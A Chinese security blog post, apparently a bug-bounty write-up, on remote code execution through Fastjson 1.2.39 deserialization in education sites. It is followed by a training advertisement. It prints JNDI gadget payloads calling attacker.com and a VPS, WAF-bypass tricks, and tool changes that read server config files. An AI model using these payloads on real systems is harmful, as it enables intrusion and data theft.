#  通杀 Edusrc通杀70rank漏洞实战高危思路和WAF绕过  
原创 猎洞时刻
                    猎洞时刻  猎洞时刻   2026-09-21 00:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d6JIQYCSTH9evFcNH31Pjh0f83GEqsibSQsGS8uUrBPLU6VJbjw8CTibOgsYYOhqqKpaQHb9BicrJcCOYhZG0tYOg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn6mG6TyJornrhz9JticBo3Nx4zhzUFXcggEDw1lkfzMI0KuLp7dW4dDCvbfgAKlLSX3yGmYg0gtXcw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
```
本公众号“猎洞时刻”旨在分享网络安全领域的相关知识，仅限于学习和研究之用。本公众号并不鼓励或支持任何非法活动。
本公众号中提供的所有内容都是基于作者的经验和知识，并仅代表作者个人的观点和意见。这些观点和意见仅供参考，不构成任何形式的承诺或保证。
本公众号不对任何人因使用或依赖本公众号提供的信息、工具或技术所造成的任何损失或伤害负责。
本公众号提供的技术和工具仅限于学习和研究之用，不得用于非法活动。任何非法活动均与本公众号的立场和政策相违背，并将依法承担法律责任。
本公众号不对使用本公众号提供的工具和技术所造成的任何直接或间接损失负责。使用者必须自行承担使用风险，同时对自己的行为负全部责任。
本公众号保留随时修改或补充免责声明的权利，而不需事先通知。
```  
  
  
  
记一次Fastjson漏洞对抗的通杀  
  
某日挖掘 edusrc 时发现一个网站非常奇怪，进入网站首页显示未授权。幸运的是前端  
  
泄露了.map 文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup4rwmuNV235Pe0BRmB8Dv9Hyz4C6sB3K7IId7nq9HmzicEEquUk2CF6iak32iaibFQiagjiaY9AVoXV7TTvcibooYib4l5Xicza7fDVpWFc/640?wx_fmt=png&from=appmsg "")  
  
  
  
通过分析前端 js 发现了 CXF 服务器接口地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup7Tb20oibiaFicQRgDtWVjwOMW7bIOalmnhneyTVlibRgb6uwehlc2JrZUIT79XVTia7GQk5HhWV36HiaHYN7bSTkTV170vRzz7ZTF4Q/640?wx_fmt=png&from=appmsg "")  
  
  
根据接口文档信息构建 post 请求 corpBillInfo，请求体是 json 类型并且参数名是 request，那么可以构造下面请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4K07zecRV29o5MlqTMuMMp7QBRbtkM0lYLOm2pdDaUP25zuleYyfmUfwKWQmh9D9ejCbdQ3ZDz9C5OrfIJCmMfqzCqDaiaAExo/640?wx_fmt=png&from=appmsg "")  
  
  
通过其他接口测试，确认后端是 spring 项目，那么探测一下后端的 json 解析库是什么，  
  
去掉一个花括号引导报错，出现了 JSONException，说明后端是 fastjson 解析库，再次探测版  
  
本,同时确认目标是否开启了 AutoType 机制。探测版本 payload 如下:  
```
{"@type":"java.lang.AutoCloseable"a["test":1]
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup70b3SWyaAzTEPhXcHTCnxcAnfVkCCUNduKPU1mibYIXaE57g7yfKqnIlNX7qiaHhxC0nZIdUfCKK6zZcPDVT8FoHtzWfQHqjADI/640?wx_fmt=png&from=appmsg "")  
  
  
这里爆出了 fastjson 版本是 1.2.39，并且确认开启了 autoType 机制，进一步探测目标是否可以出网，先进行 dns 解析，payload 是  
```
{"@type":"java.net.Inet4Address","val":"dnslog 地址"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4l2bj2wjWRLW0Yg3VkQrlyCYYsP2ts47yOY77UQMxibdkxvKYOLFuAbTicPc7O6nAzBObksBHDkkTviapRIP7Om3R6ZnqPUWQ4ws/640?wx_fmt=png&from=appmsg "")  
  
  
这里 dnslog 平台成功收到解析，接下来就可以着手探测存在哪些 jar 包插件。  
  
【核心原理】  
  
Fastjson 通过 @type 指定反序列化类，配合可实例化的类（如 TemplatesImpl、  
  
JdbcRowSetImpl）进行 JNDI 注入或加载恶意字节码。  
  
  
【1. JNDI 注入链（常用 RCE）】  
  
利用类: com.sun.rowset.JdbcRowSetImpl  
  
利用方式: 指定 dataSourceName 为恶意 JNDI 地址（如 ldap://attacker.com/Evil），并  
  
设置 autoCommit=true 触发 lookup  
  
Payload 示例:  
```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```  
  
  
【2. 本地字节码加载链（不依赖 JNDI）】  
  
利用类: org.apache.ibatis.datasource.jndi.JndiDataSourceFactory（需 MyBatis 依赖）  
  
利用方式: 通过 properties 设置 JNDI 地址  
  
Payload 示例:  
```
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://attacker.com:1389/Exploit"
  }
}
```  
  
  
【3. TemplatesImpl 链（加载本地字节码，需开启 AutoType）】  
  
利用类: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl  
  
利用方式: 将恶意字节码存入 _bytecodes 字段，触发 Transformer 加载  
  
限制: 需要能够绕过 AutoType 的黑名单（1.2.39 版本黑名单较弱，部分链仍可用）  
  
Payload 示例:  
```
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": [
    "恶意 Base64 字节码"
  ],
  "_name": "test",
  "_tfactory": {
  },
  "_outputProperties": {
  }
}
```  
  
  
【4. 版本特定利用点（1.2.39 黑名单绕过）】  
  
由于 1.2.39 版本的黑名单尚未完善，以下类可能可用（需实际测试）：  
  
- org.apache.commons.io.input.BOMInputStream（结合其他链）  
  
- com.mchange.v2.c3p0.JndiRefForwardingDataSource（需要 C3P0 依赖）  
  
- org.springframework.context.support.ClassPathXmlApplicationContext（需 Spring 依赖，  
  
加载远程 XML 配置）  
  
  
【还有其他链就不再举例】  
  
我们可以发送   
```
{"@type": "com.sun.rowset.JdbcRowSetImpl"}
```  
  
来探测利用链是否存在，如果不存在或者在黑名单里 面 ， 会爆  
错误，如果存在会爆反序列化类型不匹配错误。  
  
```
JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl 
```  
  
  
这里通过探测发现存在 com.sun.rowset.JdbcRowSetImpl 和 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，  
  
并且目标出网，可以打 com.sun.rowset.JdbcRowSetImpl 远程 jndi 注入。  
  
我这里使用的工具是 JNDIExploit-1.3-SNAPSHOT.jar，在自己的在 VPS 上运行该工具。  
  
执行命令  
```
 java -jar JNDIExploit-1.3-SNAPSHOT.jar -i <VPS 地址> -l 53 -p 80
```  
  
（监听 LDAP53 端口和 http80 端口）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6RQkM1xZJbXvmEfkH3zqn6Sf6aHp0KclhIiaXGkqiaP6S8l3X9C4Xw3Os4Vxc69VhibMawUnUG1S017GiapiczleXNdG5R72u5f5Fw/640?wx_fmt=png&from=appmsg "")  
  
  
请求 Payload 为：  
```
{
  "@type": "cn.com.szhtkj.auvgo.dto.CorpBillInfoRequest",
  "request": {
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://<vps 地址>/Basic/TomcatEcho",
      "autoCommit": true
    }
  }
}
```  
  
  
  
payload 这里的   
```
ldap://<vps 地址>/Basic/TomcatEcho。ldap://<vps 地址>:53
```  
  
 就是 vps 启动监听的 53 端口，  
  
/Basic/TomcatEcho 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义 header cmd: whoami 的方式传  
  
递想要执行的命令。利用 Fastjson 1.2.39 的反序列化漏洞，通过双重 @type 绕过调用 JdbcRowSetImpl 触发 JNDI 注  
  
入，连接 LDAP 服务并使用 TomcatEcho 模块，在 Tomcat 环境下实现命令执行回显，将结果直接返回到 HTTP 响应  
  
中。该工具地址为   
https://github.com/0x727/JNDIExploit  
 开发方解释如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4MRDrluHcs9ttvXeNc6etdChAt2s1Sx0Srm6l2RXGRicrjISdUVRouFsERQkWq5oXH0IISCV2W2svNBib973Xp1mYusxoQ1kBLY/640?wx_fmt=png&from=appmsg "")  
  
  
执行 whoami 命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup7VuzIjpdtzq9PuqXTYBuKPsLm4ClIZRGeclTQesC0E9eC4YicCANg0rsUmD0j7uFJCXvubhHnoibDSIUsibvFYA4OnWia8u5niayfY/640?wx_fmt=png&from=appmsg "")  
  
  
执行 ipconfig 命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup5s5dwybDVWicKwXAiaibn6wicZ7vicDRicXggolarS5MaIhDjibibKErVpuWtzdFVJgG1WYvwaHDgyspeRZbFrUic5ZxDVCPuzaRDeM0g8/640?wx_fmt=png&from=appmsg "")  
  
  
测试结束点到为止。  
  
上述是这个通杀漏洞中最容易的网站，该网站的可能不存在 waf 并没有任何阻拦，下面  
  
是通杀案例中存在比较容易绕过的 waf 的网站，发送带有@type 的请求体会在网络层面阻断，  
  
如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup4haBVgjc0EATKOYe9ydhibLcibvxLUlNLTgKrC1QF6ia9gaQhGNvoKA3ic1J8SRJCAOYtY7TOYV71mUIaoicfMEYicLXqicfS6k4llNc/640?wx_fmt=png&from=appmsg "")  
  
  
这里可以通过添加任意参数，并包含大量脏数据绕过，payload 如下：  
```
{
  "@type": "cn.com.szhtkj.auvgo.dto.CorpBillInfoRequest",
  "request": {
    "f": "(俩万个 a)",
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://<vps 地址>/Basic/TomcatEcho",
      "autoCommit": true
    }
  }
}
```  
  
  
  
执行效果 whoami 如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup4DLDQ041OKDKmxBdXt8dD8ITEK0ZYqakBtrgtSlhJcH46ObBmRbNvy0icTOrRWspCLmgwuMd3UWYjUboaFvjibTkHOPJagibmeDI/640?wx_fmt=png&from=appmsg "")  
  
  
除此之外通杀的大部分网站禁止进入 CXF 服务器获取接口，所以获取不到接口信息，  
  
只能通过前端登录界面抓包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5PwV9pwqBtCibyQRFbp0wKHsuLiaK192AdiaYHnaQw7HHFILbPwKGdIO4WiaPvc4ZibElhgcFTdGR6n0CG9WE06axAqQxHu8Eku5No/640?wx_fmt=png&from=appmsg "")  
  
  
这里可以看到请求体加密了，CXF 服务器中的接口没有加密，可能是因为部署在 CXF 服  
  
务器的接口并不是高风险操作或者敏感数据进而没有加密，接下来就是打断点分析前端加密  
  
代码，并且编写 python 加解密函数，这里解密后的数据内容如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup63FdhMMKwTdzAMpy2KlfeDcuAA4u1Eklpb9wK3yO1EOV3kgliaUHOLqW44Pa6uiaj1KzGibvKKRyyj0LdxHnjVlqh2EqoMWt7dwk/640?wx_fmt=png&from=appmsg "")  
  
  
同样我们可以将恶意 payload 加密：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5qkzm8n2BSnIDEWpzibiaX1SUlPtxdHjdAJIQbGPvLnjm7eibC6kNZIJe3Ogicw5Hva6bOfvic7BJ0cmGuvnvkx0o526XslDgibw7vA/640?wx_fmt=png&from=appmsg "")  
  
  
执行 whoami 效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup7oG4ibI1m4OiaLa56qCs2RYWDxE2X05lQoiajIUgbiasGxLMg7wMiczuHL43bYRKVGK4l1KD09XHP94R6QR20ibHV1ibibGzWFIIZ9qv0/640?wx_fmt=png&from=appmsg "")  
  
  
最后该通杀漏洞最困难的几个网站思路如下：  
  
第一个网站这里发现如果请求头中存在 whoami 恶意命令，waf 服务器将从网络层面阻  
  
断，并且将 whoami 命令单纯 base64 加密或者 unicode 加密并不能绕过如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5iaYx5PbHZalB15xgYAx6xwG0ncs8LADSKps4X8AsBTp4oG0G1HE2IyaMkQib1XsM75cZIcXIt0UX9vSJoUDAk0v79Fu98ofo3s/640?wx_fmt=png&from=appmsg "")  
  
  
通过翻找 JNDIExploit-1.3-SNAPSHOT.jar 工具的使用说明，并没有任何绕过 waf 的模块，  
  
这里绕过 waf 思路是先将请求头中的命令进行 base64 编码，再进行十六进制编码，请求体  
  
示例中的 whoami → Base64 （d2hvYW1p）→ Hex（6432687659573170）从而绕过 waf，  
  
同时 whoami (加密后 6432687659573170)JNDIExploit 工具的 TomcatEcho 模块并不能识别加  
  
密后的执行命令，所以我们需要二开 JNDIExploit 工具，在 github 获取项目源码，修改  
  
TomcatEcho 模块内容，获取请求头中 cmd 参数后面的命令后先将十六进制字符串解码为字  
  
节数组，再 base64 解码为命令字符串。  
  
更改内容如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6bHRGGktBGWCk4Vf6JmjwlL9n9n3iaEbpLgib9OwUbXcD6OWwsdcIkEdWCguhbkJ1BJdLLrqbO9FFLLZsB2hRcqibc05iatx5J5Kw/640?wx_fmt=png&from=appmsg "")  
  
  
此时再次使用二开的工具就可以成功执行命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4L6JYvjSZ7ZWUQDpEw4sf6DXaJ5eBHicm017yvGZXiackTWeicQcJN528JT6IAQ1DKFkeagm7m1o3D5eHTQuJrlTO5UVsrabVKCw/640?wx_fmt=png&from=appmsg "")  
  
  
第二个网站也是一样请求头中存在 whoami 恶意命令，waf 服务器将从网络层面阻断，  
  
并且将 whoami 命令单纯 base64 加密或者 unicode 加密并不能绕过。那么我们使用二开的  
  
wccc-JNDIExploit.jar 来进行渗透，但是又出现新的问题了，服务器权限不够，java 不能调用  
  
cmd 执行命令，如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4nukn1HfYpkiboicdm7OWGE1tEZZ8bHvGia7h1MZxHEQBGqybEobAtCZqNkz24giaEOjvfiagvUOVJGiaf3xUyNoOBWdjXgic8icHGkwo/640?wx_fmt=png&from=appmsg "")  
  
  
这 里 报 错 内 容 是 ： Cmd decode error: java.io.IOException: Cannot run program "cmd.exe":  
  
CreateProcess error=5 这个错误信息表明 Java 在执行 cmd.exe 时遇到了权限问题（error=5  
  
通常指“拒绝访问”）  
  
这里我想了很多办法都失效了，通过不断分析 JNDIExploit 源码，突然灵光一闪，这里的报  
  
错是在 trycatch 捕获到异常后抛出，那么我们在 catch 代码块中通过 System.getenv()获取环  
  
境变量。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4JKHEK2D696qzcutYHTQIZ2cWUt4P6iaicKSFMcibYsE4Jb2H0cLbwNcJHb8PN8w5gGv3JfxwuFD6qSlRdQjBbKw9G4NmdrTNo04/640?wx_fmt=png&from=appmsg "")  
  
  
执行效果如下：   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5Z4GcI2iaLgvD3aiaFIVSzY3tIrt2icaSA6UaNjicPC3aYNFMIvbWQm61FH9N2wTh88fiatiaBn0ElgUVibo0FIkDHCulR5KCYCzIkNk/640?wx_fmt=png&from=appmsg "")  
  
  
成功获取到环境变量，账户是 LOCAL SERVICE：最低权限的服务账户  
  
该账户通常可以  
  
读取系统目录 可以读 C:\Windows\System32 等，但通常不能写  
  
读写自己的临时目录  
  
 C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp  
  
读写自己的配置目录  
  
 C:\Windows\ServiceProfiles\LocalService\AppData\Local\ 下  
  
监听本地端口 可以启动 Tomcat 监听 8080 等端口  
  
所以可以读取 Web 应用源码和配置，我这里再次修改 wccc-JNDIExploit.jar 先尝试读取配置  
  
文件，先列出 tomcat 的 conf 文件夹所有文件，项目代码如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4EicAArLiblt4vKNuSxH3242CFJ7NqMJzPYhZQibcrIEDcfvz8BIwzvBlRUMEAZGynQ4tds3IrlZkhQibDtDd2oES4SRG1h2mo3Oc/640?wx_fmt=png&from=appmsg "")  
  
  
再次监听端口发起请求，成功获取 conf 所有文件名称：   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6bGpN3sRpzp3Cdm52PiahuJAYj9TSwBBqok9baibZSakyWogBDVnN2uHXDtaSPqtO55sp5ZrTiaeibDXgBoxVkvAJDN9v3g0EiaialU/640?wx_fmt=png&from=appmsg "")  
  
  
此时我们就可以读取文件，再次修改 wccc-JNDIExploit.jar，尝试读取 context.xml  
  
核心代码如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup72uQDHRqzZZw6gewlKyGPJNnjZdibFJOOnQOXNPicozUcKWWZcKibVlSFRNSNM8c5YibIc9tibY5aP5GJJibL3vU6Jh8KupibWNCkNtU/640?wx_fmt=png&from=appmsg "")  
  
  
执行效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5Pq9OpVkiaRAt4u3ZyibkRaVlgvTKkKxFZas3Ou2mCRTbqNlQULwicj6nFaV6wicW68ohs7qz69mHjhl3ZXKxz0NOrn6KoMjb4IrQ/640?wx_fmt=png&from=appmsg "")  
  
  
成功读取 context.xml 配置文件，LOCAL SERVICE 还可以写入文件，太过麻烦，此时已证明危  
  
害，不在进一步测试。  
  
  
  
以上漏洞均已经提交并且修复，请勿尝试复现。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ucA3HFqtup7a8qjl43RMzrQdb8CtT6d2HbibSPuCbwiawuE9rITLXpZbtZUx1ZRgYHdgG4tLOkXic0ROZsrwvl0dpJFtJI81piahJlmrSnZGScQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/doerbbgECwpeFnACfhfnjV0KRib0wx8dSYibBibXfvnlSJKZjVwqDkT4p8w3YR3kE9V23USEQoTLWyuxElcVuDohMJ7XibHRYDiaKjomSfhbOx7A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/PRjdmUELtVDZsOJib3BlegVyicZrfRqrkUKQ2sIP9mwxpzUymkzJrv7ZbXh9rJdWGeAJdlkFtQGCBgd5XmaqJdMEzusgnCkyPeGYrn75kcKc0/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/G0iaFtEibWU95PS1s38UE9icpFGHNBvGE8hBeZwkn4LbnvYJfIezdAS9Xqibfaot7vGRRkl21iaBHcKQCxzWCSm3nLpMIGlqCib7xqnZwVrGERtek/640?from=appmsg "")  
  
挖洞、赏金和入职实战班  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/IpAzibH6mLiaXTmWkTA7SecLb1jwcPkGLUTxdh3RrsOTpfbeDAhJDpYx84YbCPRO1jVVbTez7icvxTkJeCPTYtkQ6dLVxded0jzsl2bGy417cA/640?from=appmsg "")  
  
NEW JOURNEY IN TECHNOLOGY  
  
AI赋能挖洞培训  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/n4yj6uk7icAClBAquKgcqEdUm6z5bsKzGicqXtoX1Om6N3yP4QmZal5V9M19efUWMunG6pdHiaUfVzmTmGoFfn3PgDvic3d8HyDTSuqLMpjgAlk/640?from=appmsg "")  
  
  
网安学子应该做什么？  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ne7st7osWQv1cP0Rq7A6Kc0LuuWKCz4UWxGAAlcibvibYSPOEbrMmjCSzYAgtHlBoEuEpBwOczupW4VKQOgphRoQCmPdjKpIfallIqhgQ4SwE/640?from=appmsg "")  
  
  
现在很多学生师傅，经常问我，学生没法去护网，是不是没法进入网安行业了？其实并不是的，条条大路通罗马，现在去不了护网不一定是你的原因，也许是你没毕业，也许是你年龄太小，无法参与。  
  
  
但是，如果你能在空余时间中，磨练好自己的技术能力，夯实挖洞基础，不仅能获取一些CNVD、EDU证书，更能挖掘SRC赏金和参与网安大厂实习。  
如果你能做到这些，所获取的成就，比单纯参加护网收益更高。  
  
  
还有人经常问我，我明明自学了那么多网安技术，B站也学了很多，一两年了为什么迟迟在实战无法上手？只能去打靶场？  
 那是因为你没经过系统化实战训练，你学的技术全是碎片化的，今天学漏洞，明天学python，后天学kali，靶场和实战断崖鸿沟，这样学一辈子难以入门，更有网安垃圾培训，全程只有靶场，根本就没有带学员去实战挖洞培训。  
  
  
只有真正的实战挖洞能力，永远都是你在网安这个行业的  
核心竞争力  
！挖洞足够强，无论是就业大厂，还是实现SRC赏金，都是水到渠成！这些远比其他的更重要！  
  
  
如果有挖洞入职培训咨询、网安考证、扩列等，欢迎加我。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5CibqjOAgcKHNZ1YnlPjWTibMUQunqC46C4icblvvlKhPyWwhPiba6ibW5ZUG4HWSQiccN3Ka9HhtwrMzt5WrAoAcCwfYb42MkiaojCk/640?wx_fmt=png&from=appmsg "")  
  
猎洞团队介绍  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ne7st7osWQv1cP0Rq7A6Kc0LuuWKCz4UWxGAAlcibvibYSPOEbrMmjCSzYAgtHlBoEuEpBwOczupW4VKQOgphRoQCmPdjKpIfallIqhgQ4SwE/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/UKNVa82CwibfF1ovv4q3fnQ8sib70fohUsibxRVGetvW2trw171icE2PACxlWpIbLOATzduVTL40KNS6GEalG5tqDxdoibe57mYApibHRb4j8iaSyc/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XNw8Gs7pfmhLibl5aWHeBYCtCO74HXfmFDj5PcJUHfBG4To3m8gGZG1dUFIM5hTU24zSeuQvpZjicc29nJfkuIrxUukkyLBfLpribX42eTqAzY/640?from=appmsg "")  
  
我们团队自从2023年成立以来，历经三年发展，已经在安全圈内获取超多学员的加入，并且经过培训和一对一指点解答后，成员已经遍布网络安全大厂，如长亭科技、奇安信、绿盟科技、安恒信息、360、深信服科技、启明星辰、亚信、微步等多个安全厂商，现在经常在安全厂商，同一个办公室、区域，可能就有我们多个学员，也非常感谢各位师傅们的支持，往后的课程，内容和质量只增不减！  
  
  
团队学员对于一些SRC平台，如EDUSRC平台，  
2026年斩获团队榜单第一、2026个人榜第一，  
在2025斩获团队榜单第四、成员个人榜单第一，诞生多个千分Rank和证书大满贯的师傅。  
  
  
在企业SRC方面，网易SRC2026年榜第一、看云SRC2026年榜第二、爱奇艺SRC2026年榜第四、麦当劳SRC2026年榜第三、国通星驿2026SRC年榜第一，等等其他多个SRC年榜前十，  
还有CNVD单人获取证书量摆不下展台，并且在AI时代的来临，我们也是同样推出AI自动化挖洞等AI系列课程  
。  
  
  
我们的上面介绍的挖洞排名下面文章有真实图文介绍：  
  
[猎洞时刻SRC挖洞&入职培训｜近期成绩 （文末抽奖）](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490991&idx=1&sn=478c4ec5cd1d512c79492d10a93addab&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EL1yQYzv6RpXc24k1JYGxLA89trBry5yYP0biaEd6ljbwPgnAashzKG8JA2gRNyuE3DklaXvSPmres8ocAM3wSSpHzfRL6X5HwUJX4pjbehc/640?from=appmsg "")  
  
PART.01  
  
  
网安大厂真的很难进入吗？  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZDHiayEzyt870FWQg0ZdaNuq3nMgnZrASHYqznaMKcVD7cE4F4iccJM35sWZytlKVe6DV0gOmS2caibg3mUMmc8cxErpFvXmLf9W99udVBd9Uk/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kgEbbowanP9gZiavdq67qv1UhejqWMNHRyhmdoZsiat0Ow1peiaJ5hhlK8efgFnWnlKtJ0GgE80kyexnEQiawzZ4Gia6dsm9t7GBGbLurmtloZiaU/640?from=appmsg "")  
  
    网安大厂，只是在网安行业是大厂，放眼全国，实际上也只是规模上千人或者勉强上万人的企业，  
是没法和互联网大厂企业的规模比拟的，  
所以说，他并没有那么高的难度，并且也不怎么卡学历  
，很多都是双非本科可以随便去，剩下主要看技术能力！当然，专科的也可以，比如长亭，不卡专科，只看技术。  
  
  
     那么剩下的就是技术能力的要求，那么现代网安大厂，需要什么技术能力？  
  
  
简单就是下面几个要求：  
  
1、对于常规实战挖洞必须非常熟练，至少Web、小程序和APP你都能渗透测试。  
  
2、其次具有丰富的项目经验，那么项目经验从哪来的？也就是你平时参与一些护网项目、渗透项目，还有实习时候的项目都可以。  
  
3、掌握学习前沿技术的能力，比如目前的AI非常火爆，现在很多安全企业，在面试时候，会把AI能力纳入面试要求。  
  
4、这个就是拔尖要求了，你如果没有，也不影响你就业，你如果会，那么就是加分项，比如过硬的代码审计、Java安全、内网渗透、CTF之类的加分项。  
  
  
前面三个算是必须项，第四个算是加分项，所以从此可以看出来，都是围绕着实战挖洞进行的，你只有掌握实战挖洞，才能做到去做项目、去实习和就业。  
  
  
    而对于以上要求，其实并不难，只要前三个能达到，基本上就没什么大问题，而这些均在我们的培训范围内，我们只做实战方面的培训，近两年，在我们猎洞团队内出来的，  
入职这几个安全大厂，比如长亭科技、奇安信、360、绿盟科技、安恒信息、亚信安全、启明星辰等安全公司，起码也有上百个。  
几乎每个安全大厂，每个地区分公司，每个安全技术部门，都有好几个学员是来自我们这里。  
  
其次还有入职字节跳动、腾讯、智谱、快手、希音、bilibili等会联网大厂的安全部门！  
  
  
  
口说无凭，证据呢？如下，可以  
左右  
翻转看一看，这也只是一部分成绩  
  
（这个动图显示不全，只截取了三分之一，实际上更多offer）：  
  
  
  
《--可以左右滑动看猎洞学员offer--》  
  
  
←左右滑动查看更多→  
  
实际offer比这个多的多。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ivib6bxzklFLGzk9icoQ1lmhSwMbj4KY9dwia7B0vkqicjnGEpJExgbFE9wneficBEGSHS6tA1gDJfhDiaoTr8cRfuFczl06pcaBicoXSwzBMGqEsU/640?from=appmsg "")  
  
  
  
还有师傅问我，你们这个实战培训，和我平时学的靶场有区别吗？  
  
  
01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/oecycaFiaQAfKvCUxb26SiaK34LNIQwN6jCOZVfdFcjcawo1osRTPqsO9hsaajTYXUFYN8kpX4JaaJtEuUuO8jJceKvC4UQnPEDn595q1EiboM/640?from=appmsg "")  
  
  
  
这个我只能说，  
靶场永远都是靶场  
，他只能在零基础阶段学习辅助，一旦你想要走的更高、更远、挖赏金、就业，  
你挖一辈子靶场，都达不到！  
所以，尽早提升实战能力，是重中之重，而那些靶场，只能算是你练手零基础的工具。  
  
  
如果你学的内容，  
还是一堆天天教学靶场  
，无论是基础还是进阶，全是靶场的，那么这种培训内容，充其量只能算是零基础学习，远达不到就职和挖SRC赏金要求。  
  
什么时候学习实战比较好？  
  
  
02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/oecycaFiaQAfKvCUxb26SiaK34LNIQwN6jCOZVfdFcjcawo1osRTPqsO9hsaajTYXUFYN8kpX4JaaJtEuUuO8jJceKvC4UQnPEDn595q1EiboM/640?from=appmsg "")  
  
  
  
学习挖洞实战是越早越好，你沉淀的时间越久越好，别人大三还在打靶场，你已经就业不愁了，可以挖不少赏金可以独立生活了，剩下时间可以学更深入的网安领域。  
  
  
如果  
你已经大三大四，面临就业，如果还想着打靶场、考证书，无实战能力就想着就业，你还是太天真的！我劝你还是仔细思考一下吧，没有一个企业会要一个没有实战能力，  
不能给企业带来收益的员工，他们只会招聘一个技术更强的员工来满足项目要求。  
  
  
所以如果你大三大四了还不会实战，就越应该抓紧学习这方面技能，否则校招时候就会知道什么是深沉大海。  
  
  
你实战越早，经验丰富，CNVD、EDU证书一大把，挖洞赏金，企业SRC排名好几个，你觉得会有企业不喜欢你这样技术好的吗？  
技术行业，就应该要有技术，而不是搞什么歪门邪道。  
  
  
我们这边就有好几个刚上大学大一，甚至高三时候跟着我学的，  
大一下学期就去qax打红队实习，企业SRC年榜好几个  
，你觉得他们这类人，能缺少工作？以后最次保底也是个安全大厂，好的话还可以去互联网企业or甲方安全。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sZNhSEe8By4vxLsNWQQzRFqCouibouukVI8ibChbXNwlxM08j2icZy0jUrewYicD68tBibgW1N9U8Nl3ZV1jslabgxQpIx3micLhRWLAhOaQg76EY/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CGSu2ia7A7PiaFQHzywGD1oibcIHefVOOqHng7I038nfNNUHSVv3Eyibe6xdo0PX1a75vMWpdzz1q4NJCbDXgVwibdibU8fArDfLmnZQfTl7ruHaE/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/sZNhSEe8By4XzViaeg75icD56Zo6C2OO77OKibjbpWDgGImcU2zQZodoXt18qHBQqDnLjZ08HO4UrVUnN66rIs5ajvLmJQYU6ricK2cBgHHODfs/640?from=appmsg "")  
  
  
  
